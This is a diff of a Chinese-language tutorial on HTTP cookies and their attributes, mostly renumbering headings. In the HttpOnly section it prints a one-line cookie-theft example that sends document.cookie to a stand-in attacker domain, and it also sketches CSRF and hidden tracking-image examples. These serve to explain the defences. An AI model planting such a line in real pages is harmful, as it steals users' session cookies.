@@ -3,19 +3,19 @@
 ## 1、概述 - ♥
 `Cookie` 是服务器保存在浏览器的一小段文本信息，一般大小不能超过`4KB`。浏览器每次向服务器发出请求，就会自动附上这段信息。
 
-### Cookie不适合客户端存储
+## 2、Cookie不适合客户端存储
 
 `Cookie` 不是一种理想的客户端储存机制。
 - 它的容量很小（`4KB`），缺乏数据操作接口，而且会影响性能。
 - 客户端储存应该使用 `Web storage API` 和 `IndexedDB`。
 - **只有那些每次请求都需要让服务器知道的信息，才应该放在 `Cookie` 里面。**
-### Cookie主要用途
+## 3、Cookie主要用途
 `Cookie `主要保存状态信息，以下是一些主要用途。
 - 对话（`session`）管理：保存登录、购物车等需要记录的信息。
 - 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
 - 追踪用户：记录和分析用户行为，比如系统自动推送。
 
-### Cookie的元数据
+## 4、Cookie的元数据
 每个 `Cookie` 都有以下几方面的元数据。
 - `Cookie` 的名字
 - `Cookie` 的值（真正的数据写在这里面）
@@ -25,7 +25,7 @@
 
 例如，用户访问网址`www.example.com`，服务器在浏览器写入一个 `Cookie`。这个` Cookie` 的所属域名为`www.example.com`，生效路径为根路径`/`。如果 `Cookie` 的生效路径设为`/forums`，那么这个 `Cookie` 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 `Cookie`，一起发送给服务器。
 
-### cookieEnabled属性、document.cookie属性
+## 5、cookieEnabled属性、document.cookie属性
 用户可以设置浏览器不接受 `Cookie`，也可以设置不向服务器发送 `Cookie`。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开`Cookie` 功能。
 ```js
 window.navigator.cookieEnabled // true
@@ -34,7 +34,7 @@ window.navigator.cookieEnabled // true
 document.cookie // "id=foo;key=bar"
 ```
 
-### 使用Cookie注意事项
+## 6、使用Cookie注意事项
 
 不同浏览器对 `Cookie` 数量和大小的限制，是不一样的。一般来说，
 - 单个域名设置的 `Cookie` 不应超过`30`个，
@@ -42,12 +42,12 @@ document.cookie // "id=foo;key=bar"
 - 超过限制以后，`Cookie` 将被忽略，不会被设置。
 
 浏览器的同源政策规定，两个网址只要域名相同，就可以共享 `Cookie`。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 `Cookie`，可以被`https://example.com`读取。
-## 2、Cookie 与 HTTP 协议 - ♥
+## 7、Cookie 与 HTTP 协议 - ♥
 - HTTP 响应：Cookie 的生成：[link](./4-cookie.html#_2-1-http-响应：cookie-的生成)
 - HTTP 请求：Cookie 的发送：[link](./4-cookie.html#_2-2-http-请求：cookie-的发送)
 
 `Cookie` 由 `HTTP` 协议生成，主要供 `HTTP` 协议使用。
-### 2.1 HTTP 响应：Cookie 的生成
+## 8、HTTP 响应：Cookie 的生成
 服务器如果希望在浏览器保存 `Cookie`，就要在 `HTTP` 响应的头信息里面，放置一个`Set-Cookie`字段。
 ```js
 // 响应头 - 浏览器保存一个名为foo的 Cookie，它的值为bar
@@ -55,7 +55,7 @@ document.cookie // "id=foo;key=bar"
 ```
 一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。
 
-#### 修改cookie
+## 9、修改cookie
 
 如果服务器想改变一个早先设置的 `Cookie`，必须同时满足四个条件：`Cookie` 的
 - `key`
@@ -76,7 +76,7 @@ document.cookie // "id=foo;key=bar"
 'Set-Cookie: key1=value2; domain=example.com; path=/'
 ```
 
-### 2.2 HTTP 请求：Cookie 的发送
+## 10、HTTP 请求：Cookie 的发送
 浏览器向服务器发送 `HTTP` 请求时，每个请求都会带上相应的 `Cookie`。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 `HTTP` 头信息的`Cookie`字段。
 ```js
 // 请求头 - 向服务器发送名为foo的 Cookie，值为bar
@@ -89,15 +89,15 @@ document.cookie // "id=foo;key=bar"
 服务器收到浏览器发来的 `Cookie` 时，有两点是无法知道的。
 - `Cookie` 的各种属性，比如何时过期。
 - 哪个域名设置的 `Cookie`，到底是一级域名设的，还是某一个二级域名设的。
-## 3、Cookie 的属性 - ♥
+## 11、Cookie 的属性 - ♥
 - Expires，Max-Age：[link](./4-cookie.html#_3-1-expires，max-age)
 - Domain，Path：[link](./4-cookie.html#_3-2-domain，path)
 - Secure，HttpOnly：[link](./4-cookie.html#_3-3-secure，httponly)
 - SameSite：[link](./4-cookie.html#_3-4-samesite)
 
-### 3.1 Expires，Max-Age
+<!-- ## 12、Expires，Max-Age -->
 
-#### Expires - Cookie到期时间
+## 12、Expires - Cookie到期时间
 `Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 `Cookie`。它的值是 `UTC` （`Universal Time Coordinated`，世界协调时间）格式，可以使用`Date.prototype.toUTCString()`进行格式转换。
 ```js
 // koa
@@ -109,7 +109,7 @@ router.get('/detail', async ctx => {
 - 不设置`Expires`该属性，或者设为`null`，`Cookie` 只在当前会话（`session`）有效，浏览器窗口一旦关闭，当前 `Session` 结束，该 `Cookie` 就会被删除。
 - 浏览器根据本地时间，决定 `Cookie` 是否过期，由于本地时间是不精确的，所以没有办法保证 `Cookie` 一定会在服务器指定的时间过期。
 
-#### Max-Age - Cookie有效时长
+## 13、Max-Age - Cookie有效时长
 `Max-Age`属性指定从现在开始 `Cookie` 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 `Cookie`。
 
 - 如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。
@@ -121,9 +121,9 @@ router.get('/detail', async ctx => {
   await ctx.render('detail')
 })
 ```
-### 3.2 Domain，Path
+<!-- ## 14、Domain，Path -->
 
-#### Domain
+## 14、Domain
 
 `Domain`属性指定浏览器发出 `HTTP` 请求时，哪些域名要附带这个 `Cookie`。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 `Cookie`。
 
@@ -131,19 +131,19 @@ router.get('/detail', async ctx => {
 
 如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 `Cookie`。
 
-#### Path
+## 15、Path
 `Path`属性指定浏览器发出 `HTTP` 请求时，哪些路径要附带这个 `Cookie`。只要浏览器发现，`Path`属性是 `HTTP` 请求路径的开头一部分，就会在头信息里面带上这个 `Cookie`。
 
 比如，`path`属性是`/`，那么请求`/docs`路径也会包含该 `Cookie`。当然，前提是域名必须一致。
 
-### 3.3 Secure，HttpOnly
+<!-- ### 3.3 Secure，HttpOnly -->
 
-#### Secure
+## 16、Secure
 `Secure`属性指定浏览器只有在加密协议 `HTTPS` 下，才能将这个 `Cookie` 发送到服务器。该属性只是一个开关，不需要指定值。
 - 如果当前协议是 `HTTP`，浏览器会自动忽略服务器发来的`Secure`属性。
 - 如果通信是 `HTTPS` 协议，该开关自动打开。
 
-#### HttpOnly
+## 17、HttpOnly
 `HttpOnly`属性指定该 `Cookie` 无法通过 `JavaScript` 脚本拿到，主要是`document.cookie`属性、`XMLHttpRequest`对象和 `Request API` 都拿不到该属性。这样就防止了该 `Cookie` 被脚本读到，只有浏览器发出 `HTTP` 请求时，才会带上该 `Cookie`。
 
 ```js
@@ -162,7 +162,7 @@ router.get('/detail', async ctx => {
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
-### 3.4 SameSite
+## 18、SameSite
 
 `Chrome 51` 开始，浏览器的 `Cookie` 新增加了一个`SameSite`属性，用来防止 `CSRF` 攻击和用户追踪。
 
@@ -182,7 +182,7 @@ router.get('/detail', async ctx => {
 </form>
 ```
 
-#### 第三方cookie
+## 19、第三方cookie
 第三方网站引导发出的 `Cookie`，就称为第三方 `Cookie`。它除了用于 `CSRF` 攻击，还可以用于用户追踪。比如，`Facebook` 在第三方网站插入一张看不见的图片。
 ```js
 // 浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，
@@ -190,7 +190,7 @@ router.get('/detail', async ctx => {
 <img src="facebook.com" style="visibility:hidden;">
 ```
 
-#### SameSite属性的三个值
+## 20、SameSite属性的三个值
 `Cookie` 的`SameSite`属性用来限制第三方 `Cookie`，从而减少安全风险。它可以设置三个值。
 - **Strict**
 `Strict`最为严格，完全禁止第三方 `Cookie`，跨站点时，任何情况下都不会发送 `Cookie`。换言之，只有当前网页的 `URL` 与请求目标一致，才会带上 `Cookie`。
@@ -227,7 +227,7 @@ Set-Cookie: widget_session=abc123; SameSite=None
 Set-Cookie: widget_session=abc123; SameSite=None; Secure
 ```
 
-## 4、document.cookie - 可读写
+## 21、document.cookie - 可读写
 `document.cookie`属性用于读写当前网页的 `Cookie`，前提是该 `Cookie` 不能有`HttpOnly`属性。
 ```js
 // 服务端设置cookie
@@ -249,7 +249,7 @@ cookies.forEach(cookie => {
 })
 ```
 
-### 添加cookie - 一次只能添加一个
+## 22、添加cookie - 一次只能添加一个
 `document.cookie`属性是可写的，可以通过它为当前网站添加 `Cookie`。
 - 写入时，`Cookie` 的值必须写成`key=value`的形式，等号两边不能有空格。
 - 必须对分号、逗号和空格进行转义（它们都不允许作为 `Cookie` 的值），这可以用`encodeURIComponent`方法达到。
@@ -287,7 +287,7 @@ document.cookie = 'fontSize=14; '
 document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
 ```
 
-### 5、参考链接
+## 23、参考链接
 
 - [HTTP cookies](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies), by MDN
 - [Using the Same-Site Cookie Attribute to Prevent CSRF Attacks](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
